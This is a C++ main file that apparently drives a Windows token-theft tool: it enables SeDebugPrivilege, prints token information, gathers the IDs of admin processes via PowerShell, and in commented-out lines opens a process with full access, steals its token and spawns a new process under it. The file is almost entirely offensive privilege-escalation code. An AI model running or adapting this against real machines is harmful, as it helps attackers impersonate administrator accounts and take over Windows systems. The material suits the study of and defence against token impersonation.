#include <iostream>
#include "PTHandler.h"

int main() {
    PTHandler ptHandler;
    ptHandler.showTokenInfo(GetCurrentProcess());
    ptHandler.enableSeDebugPrivileges();
    ptHandler.showTokenInfo(GetCurrentProcess());
    std::cout << std::endl;
//    ptHandler.printProcessIdNamePriorityAndElevationType(GetCurrentProcessId());
//    ptHandler.printAdminProcessesDep();
//    ptHandler.printAdminProcesses();
    std::cout << "=========================================================\n";
//    DWORD pid = 7036;
//    std::cout << "Process ID : " << pid << std::endl;
//    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//    ptHandler.showTokenInfo(hProcess);
    std::cout << "=========================================================\n";
//    HANDLE stolenToken = ptHandler.stealTokenFromProcess(pid);
//    ptHandler.showTokenInfo(stolenToken);
    std::cout << "=========================================================\n";
//    ptHandler.createProcessWithToken(stolenToken);

    std::cout << "=========================================================\n";
//    std::cout << (ptHandler.isProcessAdmin(hProcess) ? "Admin\n" : "Not admin\n") << std::endl; // <-- Doesn't work

    std::cout << "=========================================================\n";
    std::cout << "[*] - Fetching admin tokens through powershell\n" ;
    ptHandler.fetchAdminTokensThroughPowershell("C:\\Users\\ohno\\Desktop\\admin_tokens.txt");
    ptHandler.loadAdminTokensFromPowershellOutput("C:\\Users\\ohno\\Desktop\\admin_tokens.txt");
    std::cout << "[*] - Done fetching admin tokens through powershell\n";
    std::cout << "=========================================================\n";
    std::cout << "[*] - Let's see if it worked :)\n";
    for (auto& adminPids : ptHandler.adminProcessIDs) {
        std::cout << "[*] - Admin Process ID : " << adminPids << std::endl;
    }

    return 0;
}